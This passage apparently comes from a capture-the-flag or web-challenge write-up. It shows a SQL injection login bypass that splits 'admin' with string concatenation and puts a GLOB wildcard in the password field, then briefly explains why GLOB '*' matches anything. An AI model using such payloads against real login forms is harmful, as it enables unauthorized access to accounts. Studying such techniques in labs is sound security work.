I failed with that payload and kinda cluless at that time. But I found that the operator `GLOB` would be useful to exploit this site

```
username: adm'||'in
password: ' GLOB '*
```
Explanation why would I use the operator `GLOB`
`GLOB '*'` is a pattern that would match any file or string, effectively "globbing" or finding everything.
